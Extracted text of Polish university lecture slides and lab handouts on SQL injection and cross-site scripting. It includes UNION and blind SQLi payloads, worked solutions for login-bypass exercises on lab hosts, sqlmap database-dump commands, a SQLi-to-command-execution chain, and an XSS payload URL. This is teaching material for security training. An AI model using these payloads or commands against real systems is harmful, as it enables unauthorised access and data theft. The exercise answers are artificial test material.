  wykonywać testy typu:

  ' UNION SELECT 'text', 1 --


                                                                                                                                                                                                           24
s32924 2026-06-21 18:37:37
```

### Strona 25 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Przebieg ataku krok po kroku

  3. Wyciąganie danych

  Gdy liczba kolumn i typy danych są zgodne, atakujący może wyciągać konkretne
  dane, np. loginy i hasła administratorów:

  ' UNION SELECT username, password FROM admins --


                                                                                                                                                                                                           25
s32924 2026-06-21 18:37:37
```

### Strona 26 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind SQL Injection

  Blind SQL Injection (SQLi) występuje gdy aplikacja jest podatna na SQL Injection,
  jednak odpowiedzi HTTP nie zawierają bezpośrednich wyników zapytania SQL,
  bądź  szczegółów błędów  bazy  danych.  Blind  SQLi  opiera  się na dwóch
  podstawowych podejściach: boolean-based oraz time-based, które umożliwiają
  przeprowadzenie skutecznych ataków nawet w tak ograniczonych warunkach.


                                                                                                                                                                                                           26
s32924 2026-06-21 18:37:37
```

### Strona 27 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Boolean-Based Blind SQL Injection
  Boolean-based  Blind SQL  Injection polega na  analizie odpowiedzi  aplikacji
 w zależności od tego, czy warunek logiczny w zapytaniu SQL jest prawdziwy, czy
  fałszywy. Aplikacja może reagować różnie w zależności od wyniku zapytania, np.
  poprzez zmianę treści strony, brak pewnych elementów lub różnicę w odpowiedzi
  HTTP.

  Przykład zapytania:
  1' AND (SELECT LENGTH(username) FROM users WHERE id=1) > 5 --


                                                                                                                                                                                                           27
s32924 2026-06-21 18:37:37
```

### Strona 28 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Boolean-Based Blind SQL Injection
   • Część stała zapytania: 1' zamyka poprzednią część zapytania SQL.
   •  Podzapytanie: (SELECT LENGTH(username) FROM users WHERE  id=1)
    zwraca długość nazwy użytkownika o identyfikatorze 1.
   • Warunek logiczny: >5 sprawdza, czy długość nazwy użytkownika jest większa
     niż 5.
   • Komentarz:  --  ignoruje  resztę  zapytania  SQL,  aby  uniknąć  błędów
    składniowych.


  Jeśli warunek jest prawdziwy (np. długość nazwy użytkownika jest większa niż 5),
  aplikacja może  zwrócić  standardową  odpowiedź. W  przeciwnym wypadku
  odpowiedź aplikacji może się różnić. Atakujący, na podstawie takich różnic, może
  stopniowo odtwarzać informacje z bazy danych.


                                                                                                                                                                                                           28
s32924 2026-06-21 18:37:37
```

### Strona 29 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Boolean-Based Blind SQL Injection

  Proces wykorzystania boolean-based Blind SQLi obejmuje iteracyjne sprawdzanie
  warunków logicznych:
   • Sprawdzanie istnienia danych: Czy użytkownik o określonym id istnieje?
   •  Wyciąganie  wartości  krok  po  kroku,  np.  długości  nazwy  użytkownika,
    a następnie każdego znaku z osobna (sprawdzanie ASCII dla każdego znaku).


                                                                                                                                                                                                           29
s32924 2026-06-21 18:37:37
```

### Strona 30 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Time-Based Blind SQL Injection

  Time-based  Blind SQL  Injection wykorzystuje  różnice w  czasie odpowiedzi
  serwera  do  wnioskowania  o  prawdziwości  warunku.  Atakujący  wymusza
  opóźnienie w odpowiedzi serwera, gdy określony warunek jest prawdziwy.

  Przykład zapytania:
 1' AND IF(1=1, SLEEP(5), 0) --


                                                                                                                                                                                                           30
s32924 2026-06-21 18:37:37
```

### Strona 31 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Boolean-Based Blind SQL Injection
   • Część stała zapytania: 1' zamyka poprzednią część zapytania SQL.
   • Warunek logiczny: IF(1=1, SLEEP(5), 0) sprawdza, czy warunek 1=1 jest
    prawdziwy.
   •  Działanie  warunku:  Jeśli  warunek  jest  prawdziwy,  funkcja  SLEEP(5)
    wprowadza  5-sekundowe  opóźnienie. W  przeciwnym  wypadku  serwer
    odpowiada natychmiast.
   • Komentarz: -- ignoruje resztę zapytania SQL.

  Atakujący może:
   •  Sprawdzić różnicę w czasie odpowiedzi, aby potwierdzić prawdziwość warunku.
   • Wykorzystać iteracyjne podejście, podobnie jak w boolean-based Blind SQLi, do
    wyciągania danych znak po znaku.


                                                                                                                                                                                                           31
s32924 2026-06-21 18:37:37
```

### Strona 32 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Porównanie Boolean-Based i Time-Based


                                           Kryterium               Boolean-Based              Time-Based
                               Mechanizm działania         Oparty  na   różnicach  w  Oparty na różnicach w czasie
                                                                odpowiedziach aplikacji        odpowiedzi aplikacji
                               Widoczność efektów       Wymaga      zauważalnych Wymaga  jedynie możliwości
                                                             zmian w treści lub strukturze  obserwacji czasu odpowiedzi
                                                                        strony
                                    Przykłady zastosowań        Analiza warunków logicznych,  Sprawdzanie warunków przy
                                                             gdy    aplikacja    informuje  ograniczonym feedbacku, gdy
                                                           o poprawnym  lub  błędnym  aplikacja    nie    wyświetla
                                                              wykonaniu zapytania.           rezultatu         wykonania
                                                                                                      zapytania.


                                                                                                                                                                                                           32
s32924 2026-06-21 18:37:37
```

### Strona 33 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 SQLMap

  Blind SQL Injection wymaga cierpliwości, ponieważ informacje są pobierane
 w sposób iteracyjny. Jednak przy zastosowaniu zautomatyzowanych narzędzi ataki
  te  mogą  być  przeprowadzane  skutecznie    i  relatywnie  szybko.  Jednym
  z przykładów narzędzi state-of-the-art w tej kategorii jest SQLMap, który obsługuje
  każdą z omawianych dotychczas metod.


                                                                                                                                                                                                           33
s32924 2026-06-21 18:37:37
```

### Strona 34 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zapobieganie SQL Injection

  Aby uniknąć SQL Injection, należy stosować następujące praktyki:
   •  Parametryzacja  zapytań:  Użycie  tzw.  „prepared  statements”  zamiast
    konkatenacji ciągów. Podobnym, alternatywnym mechanizmem są procedury
    składowane (stored procedure).
   •  Użycie   allowlist’y:   podejście   polegające  na   zdefiniowaniu  zestawu
    akceptowalnych danych wejściowych i akceptowanie tylko tych, które spełniają
    założone przez nas kryteria.

  Dodatkowe metody ochrony:
   •  Walidacja danych wejściowych: Sprawdzanie typów,  długości   i formatów
    danych.
   •  Minimalizacja uprawnień: Konta bazy danych powinny mieć dostęp tylko do
    niezbędnych zasobów.
   •  Firewall  aplikacji webowej (WAF): Automatyczne blokowanie podejrzanych
    zapytań SQL.
                                                                                                                                                                                                           34
s32924 2026-06-21 18:37:37
```

### Strona 35 / 42

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION                                                                                                                                                 PJA.EDU.PL


          Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:37:37
```

### Strona 36 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.1: SQL Injection 1

  Zadanie wykonujemy na stronie: http://192.168.100.10/sql1/

  Pierwsze zadanie to podstawowy SQL Injection, polegający na wstrzyknięciu znaku
  specjalnego ', który zakończy string i umożliwi wstrzyknięcie dodatkowej logiki.
  Przykładowe rozwiązania:
  ' or '1'='1
  ' or 1-- x
 ' or 1#


                                                                                                                                                                                                           36
s32924 2026-06-21 18:37:37
```

### Strona 37 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.2: SQL Injection 2

  Zadanie wykonujemy na stronie: http://192.168.100.10/sql2/

  Drugie zadanie polega na dodatkowym domknięciu nawiasu ). Należy wstrzyknąć
  znaki specjalne '), które zakończą string i umożliwią wstrzyknięcie dodatkowej
  logiki.
  Przykładowe rozwiązania:
 ') or (username='admin
 ') or username='admin'-- x
 ') or username='admin'#


                                                                                                                                                                                                           37
s32924 2026-06-21 18:37:37
```

### Strona 38 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.3: SQL Injection 3
  Zadanie wykonujemy na stronie: http://192.168.100.10/sql3/

  Trzecie  zadanie   jest   identyczne   jak   poprzednie,   z  wyjątkiem   tego,
  że baza danych jest pusta. Wymaga to zastosowania techniki UNION SELECT,
  która  zwróci  z  zapytania  dane,  oryginalnie  nieistniejące w  bazie  danych.
  Przykładowe rozwiązania:
  ') union select ('admin
  ') union select 'admin'-- x
  ') union select 'admin'#


                                                                                                                                                                                                           38
s32924 2026-06-21 18:37:37
```

### Strona 39 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.4: SQL Injection 4
  Zadanie wykonujemy na stronie: http://192.168.100.10/sql4/

  Czwarte zadanie, podobnie jak poprzednie, wymaga zastosowania techniki UNION
  SELECT, która zwróci z zapytania NOWEGO (nieistniejącego w bazie) użytkownika
  admin  z  kontrolowanym  przez  nas  skrótem MD5  jego  hasła. Kod  php
  po znalezieniu istniejącego użytkownika w bazie, liczy skrót MD5 z wpisanego
 w formularzu hasła  i porównuje z tym zwróconym z bazy - oba muszą być
  identyczne, ale też oba kontrolujemy!
  Przykładowe rozwiązanie:
  Użytkownik:
  " union select "admin",md5("x")#
  Hasło: x


                                                                                                                                                                                                           39
s32924 2026-06-21 18:37:37
```

### Strona 40 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.5: SQL Injection 5
  Zadanie wykonujemy na stronie: http://192.168.100.10/sql5/

  Piąte zadanie dodaje przed znakami specjalnymi (tj. ', ", \) ukośnik \, przez co stają
  się zwykłymi znakami wewnątrz stringa, następnie ucina cały string do 10 znaków.
  Aby rozwiązać zadanie, należy w nazwie użytkownika na 10-tej pozycji podać znak
  \ (zostanie zamieniony na  \\)  i wykorzystać fakt, że nazwa użytkownika jest
  ucinana do 10 znaków (bezpieczny ciąg \\ zostanie z powrotem przycięty
  do niebezpiecznego  \   i wyescapuje następny znak  -   ' zamykający  string!).
  Przykładowe rozwiązanie:
  Użytkownik: 123456789\
  Hasło: or 1-- x


                                                                                                                                                                                                           40
s32924 2026-06-21 18:37:37
```

### Strona 41 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://portswigger.net/web-security/sql-injection/examining-the-database
  Sprawdzenie rodzaju bazy danych

  https://www.w3schools.com/sql/sql_injection.asp
  Opis różnych ataków typu SQL Injection

  https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
  „cheat sheet” dla ataków SQL Injection


                                                                                                                                                                                                           4141
s32924 2026-06-21 18:37:37
```

### Strona 42 / 42

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION                                                              POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL


                  PJA.EDU.PL
       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                                                                                                                                           42
s32924 2026-06-21 18:37:37
```

---

## 4. 10p. SQL Injection PENTEST (2)(2).pdf

Liczba stron: 14


### Strona 1 / 14

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION | PENTEST                                                                                                                                       PJA.EDU.PL
      Podatności
     SQL Injection
        Pentest
                        KOMPUTEROWYCH                         Zajęcia nr 10
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 18:37:39
```

### Strona 2 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ŚRODOWISKOUruchamianiePołączenieZADANIA10.1p10.2p10.3p LogowanieRCEFlaga……..……………………………….OpenVPN……………………..…...………..maszyn………………..…….…….……………………….……………………..
                                ŚRODOWISKO
                                                          Uruchamianie maszyn ……………………..  4
                                                              Połączenie OpenVPN ……………………….  5
                                   ZADANIA
                                                         10.1p Logowanie ………………..…….…….  9
                                                         10.2p RCE ……..……………………………….  10
                                                         10.3p Flaga ……………………..…...………..  12


                                                                                                                                                                                                            2
s32924 2026-06-21 18:37:39
```

### Strona 3 / 14

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION | PENTEST                                                                                                                                       PJA.EDU.PL


       Przygotowanie
         środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:37:39
```

### Strona 4 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed  rozpoczęciem  upewnij   się,  że  maszyny WEB   -  SQL  INJECTION
  oraz WEB - SQL INJECTION PENTEST są włączone.
  Jeżeli  coś  się  zepsuje, w  każdej  chwili możesz  je  przywrócić do  stanu
  początkowego.


                                                                                                                                                                                                            4
s32924 2026-06-21 18:37:39
```

### Strona 5 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN


  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn

  Uwaga! Wszystkie zadania z tego dokumentu wykonujemy na maszynie PENTEST.


                                                                                                                                                                                                            5
s32924 2026-06-21 18:37:39
```

### Strona 6 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                                                            6
s32924 2026-06-21 18:37:39
```

### Strona 7 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Legenda
  cat /etc/passwd - komendę należy wykonać na maszynie Kali
  cat /etc/passwd - komendę należy wykonać na maszynie Ćwiczenia
  cat /etc/passwd - komendę należy wykonać na maszynie Pentest


                                                                                                                                                                                                            7
s32924 2026-06-21 18:37:39
```

### Strona 8 / 14

#### Tekst

```text
                   PODATNOŚCI SQL INJECTION | PENTEST                                                                                                                                       PJA.EDU.PL


          Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:37:39
```

### Strona 9 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.1p: Logowanie
  Wejdź na stronę: http://192.168.100.60/
  Wykonaj atak SQL Injection w panelu logowania.
  Przykładowa nazwa użytkownika (hasło dowolne):

  ' or 1=1-- x


                                                                                                                                                                                                            9
s32924 2026-06-21 18:37:39
```

### Strona 10 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.2p: Zawartość bazy danych

  Do wyświetlenia całej zawartości bazy danych można użyć narzędzia sqlmap.
  Na wszystkie pytania należy odpowiadać wartością domyślną (enter).


  sqlmap -u http://192.168.100.60 --forms --dbs #wyświetli nazwy baz danych:


  sqlmap -u http://192.168.100.60 --forms -D pentest -dump-all #wyświetli zawartość bazy


                                                                                                                                                                                                           10
s32924 2026-06-21 18:37:39
```

### Strona 11 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.2p: RCE
  Baza  danych  przechowuje komendy  bash,  które  serwer może  wykonać.
 Po zalogowaniu, wykonaj atak UNION SELECT, w celu zwrócenia z zapytania
 komendy "id" (która nie istnieje w bazie w jako rekord).
  Przykład (należy zgadnąć liczbę kolumn np. za pomocą prób i błędów):
  123-- x
  123 union select 'id'-- błąd
  123 union select 'id','id'-- błąd
  123 union select 'id','id','id'-- działa


                                                                                                                                                                                                           11
s32924 2026-06-21 18:37:39
```

### Strona 12 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 10.3p: Flaga

  Za pomocą podatności typu RCE, wylistuj pliki w aktualnym katalogu
    i odczytaj flagę.

  Zamiast “id” wykorzystaj “ls” i “cat nazwaplikuzflagą.txt”:


     123 union select 'id','id’,’cat filename.txt'--


                                                                                                                                                                                                           12
s32924 2026-06-21 18:37:39
```

### Strona 13 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://github.com/sqlmapproject/sqlmap/wiki/usage
  Projekt sqlmap


                                                                                                                                                                                                           1313
s32924 2026-06-21 18:37:39
```

### Strona 14 / 14

#### Tekst

```text
                    PODATNOŚCI SQL INJECTION | PENTEST                                                    POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL


       Koniec ćwiczeń


                                                                                                                                                                                                           14
s32924 2026-06-21 18:37:39
```

---

## 5. 11. Błędy Cross-site Scripting (1)(2).pdf

Liczba stron: 60


### Strona 1 / 60

#### Tekst

```text
                   XSS                                                                                                                                                                      PJA.EDU.PL
       Podatności
   Cross-site Scripting

                        KOMPUTEROWYCH                         Zajęcia nr 11
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 18:57:09
```

### Strona 2 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ŚRODOWISKOTeoriaUruchamianiePołączenieZADANIA11.111.211.311.411.5 StoredStoredStoredReflectedDOM-based……………………………………………..OpenVPNXSSXSSXSSmaszynXSS--- HTMLJScookieXSS………………..……….……..…………….….……………………….……………………..……………………..……..…….…….……….………..
                                ŚRODOWISKO
                                                                       Teoria ……………………………………………..  4
                                                                 Uruchamianie maszyn ……………………..  45
                                                                     Połączenie OpenVPN ……………………….  46
                                   ZADANIA
                                                                  11.1 Stored XSS - HTML ……..…….…….  49
                                                                  11.2 Stored XSS - JS ……..…………….….  51
                                                                  11.3 Stored XSS - cookie ……….………..  53
                                                                  11.4 Reflected XSS ………………..……….  55
                                                                  11.5 DOM-based XSS ……………………..  57


                                                                                                                                                                              2
s32924 2026-06-21 18:57:09
```

### Strona 3 / 60

#### Tekst

```text
                   XSS                                                                                                                                                                      PJA.EDU.PL


         Teoria
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:09
```

### Strona 4 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Cross-Site Scripting

  Podatności  XSS  (Cross-Site  Scripting)  to  rodzaj  ataku,  który  umożliwia
  wstrzyknięcie  zawartości  (najczęściej kodu  JavaScript)  kontrolowanej  przez
  użytkownika na podatną stronę.


  Atak  staje  się  skuteczny,  gdy  napastnik  wykorzystuje  aplikację webową
  do przesłania złośliwego kodu, który następnie jest wykonywany w kontekście
  przeglądarki ofiary.


                                                                                                                                                                              44
s32924 2026-06-21 18:57:09
```

### Strona 5 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Cross-Site Scripting


  Przeglądarka ofiary nie jest w stanie rozpoznać, czy dany fragment kodu został
  wstrzyknięty przez podatność XSS. Ponieważ z perspektywy przeglądarki kod
  JavaScript pochodzi z zaufanego źródła, ma on dostęp do wrażliwych informacji,
  takich jak sesje użytkownika, pliki cookies czy inne dane pochodzące z podatnej
  strony. W  określonych  warunkach  podatność  XSS  może  doprowadzić
  do całkowitego przejęcia sesji ofiary.


                                                                                                                                                                              55
s32924 2026-06-21 18:57:09
```

### Strona 6 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Cross-Site Scripting


                                             Atakujący odkrywa
                                         podatność na stronie
                                                                                                                                                                              66
s32924 2026-06-21 18:57:09
```

### Strona 7 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Cross-Site Scripting


     Atakujący wstrzykuje
    złośliwy kod na stronę


                                             Atakujący odkrywa
                                         podatność na stronie
                                                                                                                                                                              77
s32924 2026-06-21 18:57:09
```

### Strona 8 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Cross-Site Scripting


                                         Przy każdych odwiedzinach
                                        strony przez ofiarę, przeglądarka
                                     wykonuje wstrzyknięty kod


     Atakujący wstrzykuje
    złośliwy kod na stronę


                                             Atakujący odkrywa
                                         podatność na stronie
                                                                                                                                                                              88
s32924 2026-06-21 18:57:09
```

### Strona 9 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Cross-Site Scripting


                                         Przy każdych odwiedzinach
                                        strony przez ofiarę, przeglądarka
                                     wykonuje wstrzyknięty kod


     Atakujący wstrzykuje
    złośliwy kod na stronę                                                                                 Złośliwy kod powoduje
                                                                             przesłanie poufnych danych do
                                                                                 atakującego


                                             Atakujący odkrywa
                                         podatność na stronie
                                                                                                                                                                              99
s32924 2026-06-21 18:57:09
```

### Strona 10 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Przyczyny podatności XSS

  Podatności XSS wynikają głównie z braku walidacji danych wprowadzanych przez
  użytkowników  lub  z  pobierania danych  z niezaufanego  źródła przez stronę
  internetową.


                                                                                                                                                                            1010
s32924 2026-06-21 18:57:09
```

### Strona 11 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Rodzaje XSS

  Wyróżnia się trzy główne rodzaje podatności Cross-Site Scripting:
  -  Stored XSS
  -  Reflected XSS
  -  DOM XSS


  Podział ten opiera się na sposobie dostarczenia wstrzykniętego kodu do ofiary.


                                                                                                                                                                            1111
s32924 2026-06-21 18:57:09
```

### Strona 12 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Stored XSS

  Stored XSS występuje, gdy złośliwe dane są przechowywane w aplikacji webowej
  (np. w bazie danych)  i są wyświetlane każdemu użytkownikowi, który odwiedzi
  zasób ze wstrzykniętym kodem.


  Przykłady miejsc wstrzyknięcia:
  -  Wpis na forum
  -  Opinia produktu
  -  Tytuł aukcji
  -  Nazwa użytkownika


                                                                                                                                                                            1212
s32924 2026-06-21 18:57:09
```

### Strona 13 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Stored XSS

  Atakujący  wstawia komentarz
  ze wstrzykniętym kodem, który
  wykonuje funkcję „alert()”


                                                                                                                                                                            1313
s32924 2026-06-21 18:57:09
```

### Strona 14 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Stored XSS

  Atakujący  wstawia komentarz
  ze wstrzykniętym kodem, który
  wykonuje funkcję „alert()”


                                                                                                                                                                            1414
s32924 2026-06-21 18:57:09
```

### Strona 15 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Stored XSS

  Po wstawieniu komentarza
    i odświeżeniu strony, wykonywana
  jest funkcja „alert()”


                                                                                                                                                                            1515
s32924 2026-06-21 18:57:09
```

### Strona 16 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Reflected XSS

  Reflected XSS - serwer otrzymuje zapytanie ze złośliwymi danymi, które są
  następnie „odbijane” na stronie. Jest to prostsza wariacja podatności XSS,
  jednak częściej wymaga wykonania dodatkowej akcji przez ofiarę - np. kliknięcia
 w odpowiednio spreparowany link.


  Złośliwe dane mogą przybrać formę parametrów GET/POST lub nagłówków
  zapytania i mogą być odbite np. w:
  - Wiadomości o błędzie
  - Wyniku wyszukiwania
  -  Filtrach wyszukiwania


                                                                                                                                                                            1616
s32924 2026-06-21 18:57:09
```

### Strona 17 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Reflected XSS

  Atakujący wstrzykuje kod w polu wyszukiwania


                                                                                                                                                                            1717
s32924 2026-06-21 18:57:09
```

### Strona 18 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Reflected XSS

  Wyszukiwana fraza jest wyświetlana na stronie razem ze wstrzykniętym kodem.


                                                                                                                                                                            1818
s32924 2026-06-21 18:57:09
```

### Strona 19 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Reflected XSS

  Wyszukiwana fraza jest także zawarta w parametrze GET wyszukiwania. Dzięki
  temu, atakujący może przekazać link ze wstrzykniętym kodem w parametrze
  „search” do ofiary.


                                                                                                                                                                            1919
s32924 2026-06-21 18:57:09
```

### Strona 20 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Reflected XSS

  Finalnie zatem, każda osoba która odwiedzi tak przygotowany link, stanie się ofiarą
  ataku XSS.


   https://vulnerable.website.com/?search=test%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E


                                                                                                                                                                            2020
s32924 2026-06-21 18:57:09
```

### Strona 21 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind XSS

  Blind XSS jest wariacją stored XSS. Następuje gdy złośliwy kod atakującego jest
  zapisywany na serwerze  i przesyłany do systemów wewnętrznych ofiary. „Blind”
  bierze się z faktu, że atakujący nie ma dostępu do przekazanego w ten sposób
  payload’u.


  Przykładem takiej podatności mogą być formularze z opinią, które są następnie
